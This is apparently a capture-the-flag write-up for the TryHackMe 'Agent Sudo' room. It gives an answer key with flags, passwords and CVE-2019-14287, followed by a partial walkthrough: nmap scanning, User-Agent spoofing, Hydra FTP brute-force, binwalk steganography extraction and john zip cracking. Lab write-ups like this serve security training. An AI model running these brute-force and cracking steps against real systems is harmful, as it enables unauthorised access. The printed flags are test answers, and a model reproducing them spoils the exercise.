# <div align="center">[Agent Sudo](https://tryhackme.com/r/room/agentsudoctf)</div>
<div align="center">You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.</div>
<br>
<div align="center">
<img src="https://github.com/user-attachments/assets/4af38d66-6dd1-41ae-9086-7f17ffda540b" height="200"></img>
</div>


##  Task 1. Author note
```
No need
```
## Task 2. Enumerate
Enumerate the machine and get all the important information

### How many open ports?
```bash
3
```
### How you redirect yourself to a secret page?
```bash
user-agent
```
### What is the agent name?
```bash
chris
```
## Task 3. Hash cracking and brute-force
Done enumerate the machine? Time to brute your way out.

### FTP password
```bash
crystal
```
### Zip file password
```
alien
```
### steg password
```
Area51
```
### Who is the other agent (in full name)?
```
james
```
### SSH password
```
hackerrules!
```
## Task 4
Capture the user flag

### What is the user flag?
```
b03d975e8c92a7c04146cfa7a5a313c7
```
### What is the incident of the photo called?
```
Roswell alien autopsy
```
## Task 5
Privilege escalation
Enough with the extraordinary stuff? Time to get real.

CVE number for the escalation 

### (Format: CVE-xxxx-xxxx)
```
CVE-2019-14287
```
### What is the root flag?
```
b53a02f55b57d4439e3341834d70c062
```
### (Bonus) Who is Agent R?
```
DesKel
```
<!-- 
<!-- 

## 1. Let start with basic scan 
```bash
┌──(death㉿esther)-[~/Lab-CTF/Agent-sudo]
└─$ sudo nmap 10.10.14.138 -sV -A -sC -Pn 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-07 11:46 IST
Nmap scan report for 10.10.14.138
Host is up (0.41s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.11 - 3.14 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 4.14 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   289.07 ms 10.17.0.1
2   ... 4
5   431.68 ms 10.10.14.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.57 seconds
```
### Three ports are open so Let check for web first 
![Screenshot from 2024-05-07 11-51-15](https://github.com/Esther7171/Agent-Sudo-Walkthrough-/assets/122229257/500c8eba-1fcc-493c-8264-66f6baea6bf2)
## As we see it a clue hide here we need to change user-agent in request we can do it with burpsuit but im using curl to more simplfy it 
### As i try few attempt and random guess i found out the Agent name is ```C``` , Then i change user-agent i got this,

```bash
┌──(death㉿esther)-[~/Lab-CTF/Agent-sudo]
└─$ curl http://10.10.14.138 -H "User-Agent: C"  -Lv
*   Trying 10.10.14.138:80...
* Connected to 10.10.14.138 (10.10.14.138) port 80
> GET / HTTP/1.1
> Host: 10.10.14.138
> Accept: */*
> User-Agent: C
> 
< HTTP/1.1 302 Found
< Date: Tue, 07 May 2024 06:23:54 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Location: agent_C_attention.php
< Content-Length: 218
< Content-Type: text/html; charset=UTF-8
< 
* Ignoring the response-body
* Connection #0 to host 10.10.14.138 left intact
* Issue another request to this URL: 'http://10.10.14.138/agent_C_attention.php'
* Found bundle for host: 0x557b30986800 [serially]
* Can not multiplex, even if we wanted to
* Re-using existing connection with host 10.10.14.138
> GET /agent_C_attention.php HTTP/1.1
> Host: 10.10.14.138
> Accept: */*
> User-Agent: C
> 
< HTTP/1.1 200 OK
< Date: Tue, 07 May 2024 06:23:54 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 177
< Content-Type: text/html; charset=UTF-8
< 
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 

* Connection #0 to host 10.10.14.138 left intact
```
## It Look to complicate look at this way I use ```curl``` then the web url and ```-H``` for ````--header```, ```-L``` for ```location``` 

```bash
┌──(death㉿esther)-[~/Lab-CTF/Agent-sudo]
└─$ curl http://10.10.14.138 -H "User-Agent: C"  -L  
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```
### Here is the msg that telling us That Our agent name is ```Chris``` and our password is weak, Maybe it talking about ftp password 

## 2. Let bruteforce Ftp
```bash
┌──(death㉿esther)-[~/Pictures/Screenshots]
└─$ hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.14.138 -t 40
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-07 12:07:50
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 40 tasks per 1 server, overall 40 tasks, 14344399 login tries (l:1/p:14344399), ~358610 tries per task
[DATA] attacking ftp://10.10.14.138:21/
[21][ftp] host: 10.10.14.138   login: chris   password: crystal
[STATUS] 14344399.00 tries/min, 14344399 tries in 00:01h, 1 to do in 00:01h, 14 active
```
### ftp password is ```crystal`` user ```chris```

### Let login in ftp 
```bash
┌──(death㉿esther)-[~/Pictures/Screenshots]
└─$ ftp 10.10.14.138 
Connected to 10.10.14.138.
220 (vsFTPd 3.0.3)
Name (10.10.14.138:death): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||62879|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> 
```
### Let download all this file in our system use ```get``` to download 
```bash
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
229 Entering Extended Passive Mode (|||47570|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |*************************************************************************************************************************************************************************************************|   217        2.95 MiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (0.91 KiB/s)
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
229 Entering Extended Passive Mode (|||61174|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |*************************************************************************************************************************************************************************************************| 33143       47.23 KiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (35.05 KiB/s)
ftp> get cutie.png
local: cutie.png remote: cutie.png
229 Entering Extended Passive Mode (|||31562|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |*************************************************************************************************************************************************************************************************| 34842       63.62 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (45.99 KiB/s)
ftp> 
```
### We got a text file let read content of it
```bash
┌──(death㉿esther)-[~/Lab-CTF/Agent-sudo]
└─$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```
## 3. Let do stegnography
### Ok let check strings of both png and jpg
### basically jpg is empty and there is nothing but there is something inside the cutie.png 
```bash
                                                                                                                                                                                                                                              
┌──(death㉿esther)-[~/Lab-CTF/Agent-sudo]
└─$ strings cutie.png     
IHDR
PLTE
.(CA
b+FB
8">;&@B&A>9RO =:#<A
;8$@=
.)%>A
:&AA
74-HC
Z5NK
!:@t
"6SB
?/KB
C2OB
CZWn
,Rhc
T9X@>VRMc^
`H_[z
^rmGk>t
<Nq;
Q|?Be>>^>
\!EC
\Y|M
QsK}
vEeHm
PWw5
PLlJ
)[oa
W3D?y
aPAA=
.%sPHz6/|
nVE?e82
*tRNS
IDATx
HI-(./1
	OQv:
b-J$0)
_&*G
s-H$&
	GR6
N#aH.
0v;mu
-M&auuu
<:Dhs
-E8{
=Nx6
/]l2
VZ,B
!/=Oh
0~{+w
Gs$D0
rs*KK"T
V_}$
H=p>D
30Rc
'_yR
lCfYE
oDn^
$oBpc1
A<p:
qJnU
%'Ow
xPg&
ufe=
+Mq2U
Pddd
1C\7
|>&-
i!r)y=
~WJ6
1_;Vh
:xI$
^]]^1
9]#>
Xnuz%z
[@\$-
-?(S
Hqg&
g906
fT*	!
bW[D
|*=\x'
dTWk
9tE!
'=RE|
 '&w!s
 Hv[
S0)g
x1r]
La^n
=XX{
9Dxj
t?Pu
2[Yj
,Pc(d
urx 
cYqiZ<
}p|Ck
+)-7
p*}"
;GL@
\"Rd
iR\_
iRqK
RPDf
|.-.
)?S1	
EO>j
0#xhr
kj^m
'H|@
9C&,
%-eU
8%Z0
F@%;
S3Vb
gG!P
FEm'pcy
XC-+
u{0E\
0b!G
p7h'
Zx;d"F
!N+	{A<
:#33w
x6Zg
]zho
7n[F
]s.#
%fFg
AQD!
b+i#
*yc-
j^7k
2oaOi
G@L4?4
04	'
5I?1'
L+d(
{.rx
Yqqv
	E =
] fT
<KVk
9neB
,Rk{p8
}*@'
cmoGU
SlD/
UDn 
sg/|Yv
A>:9
Ur#4e
NOOO
jD	2
0[mV
#ASv
DHIT}
^ZBl
bttM
lE -
Qx:*p
Qt+9b
6}7v
#d0L
+km"
d$ >
dbhe
JCih
!/I&
0y0G
0d"G
o~:rJ(
&3JX
DJ,A2q<
<^}o
rq=E@.
nWLI5rT):\
;{F_<
" ni
h%xi
OsIt
+lX6~
8eVh
5PKf
AL;Y
*s.,
6Y~^
8}\hZ
DXU7
e@8@
95~N
c*#L|g9
?K*Jmy
mT!jc3
Ielm&1Fl
y(BXG
-.k(
eM!\UA
_	+*\#
n<n^$
;zBF
AUh|@G0ZE
jEEM
3yhL
Wn`1b
JoWc
4f:8
K.ZA
\2l|
XJ1'
1K*K
|$|e=
Z"P6
;ogK
'nj#
r,wa.
GLujU
goux<A
$\>Sb
TOjC
mv.-C
.\Z:2"p
Im9f
SP:b,
to\Wl
^j_@K
].*F8
J9s"
k]}[
qj<ZR
VIJ3
fD"5
v<mG
)Nu26
>/gk
<j:_P
";9#H
8~{U
v|zM3
/2w=O
t\iP
b>$'
7~G;g_
nBi	
fYi2
^:(r
#B_\S1
83Dl
y"F48
{YNJK
]C3i0
z9#c
+g$5<V
&Im6
YDu+
3E)W
D&vA
)$qf6
wuvv
P;8 
:I~H'
-3NH
4]S&cS
r@r&
l6c)
^>'/H
D)@v6*
rAB4
-?EE
rP"N
fMY*
lF"|1>+
pF<TS
a1_{
 i1.
e,Rn
zF#D
2}FyUp
F#;D}
[:/v
*!F-
hw D
TH'D
]Z	A-
UUTa
j%Dc
2)Ck;
UDaB
yaav
Wqww7
	{	1
G!6R%
0,#8
#Q1u]
tI_O
4e%M
zkY|
C+C4
8;cx's
5DxG
T.WiC
\DB|
h5er
%IDUL
8yLe,
ez	qF
V++S
C=,tu
VS.i2
Db@!
,C["R
13clO
SM/;e4
iw<&D
>buX
nB+p&F
|PA<
LBl+!!F
_fc4
:c<"%e
.C|;
e#D)
{t8F
@)nNE
otzz
WyQFd9X
Kc#D
aBl<
l4$Y
ofQif
H@&!t*~
=-B<
og4|
i8NwQ
M*4>
^0!F
Dtqlv
w<Xv
q`j{%1
J@j%
2-,>$
2;20
lb1"
|tLd<
0#6o
&fGg
 i7w
;COU@
?\>x
M$z6<
`wh+P
7xE 1
$DnB
xA__
wPF|
F-NC
r>_M
]NMt
<+<8
@1UkW
a\El
E)`F
ktr*
eDvQ
q|hhh
B')Y
VcTf
!#\~'
I6!8
y|\{
h383e
J*40
o^;r"
l9C'
:G'{
;U>45G9
$tf"
"KeU$
\j|{
#o}G
a'M(>
w?q|'
x}N.
vnW*w
KgVk
z5>vbP
?fi];
@2	<h
^)QuS
d,"t
.>~B4
Nf>?
t@fD
wYc&F
/v`w!L
 7vf
J,g`
R? |
J\NN
@fb|
:dcF
-J	U
 z"N-"z
C0]D
E1]Ey
$kSh
t\( D
i@W[[
_BK41hq
rjL'
lb;vr
l&c/D
IP79
_S+=
<u%+*?`
-?P{GK
+0"c
0{BQ
84<?4
i#:8
 ]@h^
aM`G
<UVp}
zORs
=3SX~
;.W*
tJ?;
qU~a
Tl>i
"B~7
!=#DY
iwf3"~
-pR('
h:t.
\QBL?
L3}Ov
&=%(
01iI
RK:<
(*[!m
{+|D
o;'G
$^ri~!W"
PMT>\s
f1 o
Q	!OkW
$:\x0
?('C[:
$Kr:T
1"+o
6#LPJ
2KU%
! HD
]<o$
5#XZ
%ZmYy
-!o<
1F@)
J9m|>
q"HM
Hl{:
<8@*4
576#
u$RJ
0533
b,jU
DKI|
:cDT
@jp.
R@%H:
w*j+
@Xp.
Oxm	
<c`R
_X(1
AHek
$pSF
-,|va
.A0,"oS I
f'x+
IB`L
55zm\
4V.U
W44fJ"@#
gQ[r
"TN)
t-zq
	%60
*%^(
AfCH
DUp#
WW_nll
\g9R
v:]}
kHu,
7FC:d%lv
]Hu9H
8vz7
7P<O^
.uk 
}mZl
s%_'q
mfOf
#)f]
aqnJ}
&19u
Ein?x
fP"j
i[+*)
1!<31
NB7X
<~;o
6;>!o
XDXT
w*Sp
	([b!
G9qE
(A}j
^MEjOk
L^ay
"P{J
d: ]
ZT%Q
p7a4u
^[=&
IEND
<!-- To_agentR.txt 
<!-- W\_z#
2a>=
<!-- To_agentR.txt        
<!-- 
EwwT
```
### There is hidden file is in zip format inside it there are text files
```bash
┌──(death㉿esther)-[~/Lab-CTF/Agent-sudo]
└─$ binwalk cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
### Let try to extract it, binwalk ```-e``` it stands for extract  
```bash
┌──(death㉿esther)-[~/Lab-CTF/Agent-sudo]
└─$ binwalk cutie.png -e 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

```
### Here we got a folder
```bash
┌──(death㉿esther)-[~/Lab-CTF/Agent-sudo]
└─$ cd _cutie.png.extracted          
                                                                                                                                                                                                                                              
┌──(death㉿esther)-[~/Lab-CTF/Agent-sudo/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip
```
## 4. Let crack zip file
### Time to use zip2john to extract hash
```bash
┌──(death㉿esther)-[~/Lab-CTF/Agent-sudo/_cutie.png.extracted]
└─$ zip2john 8702.zip > hash
```
### Let crack it using John
```bash
┌──(death㉿esther)-[~/Lab-CTF/Agent-sudo/_cutie.png.extracted]
└─$ john hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
No password hashes left to crack (see FAQ)
```
### Hash cracked let see                                                                                                                                                                          
```bash                                                        
┌──(death㉿esther)-[~/Lab-CTF/Agent-sudo/_cutie.png.extracted]
└─$ john hash --show
8702.zip/To_agentR.txt:alien:To_agentR.txt:8702.zip:8702.zip

1 password hash cracked, 0 left
```
### zip password is ```alien```
### Let extract it  -->

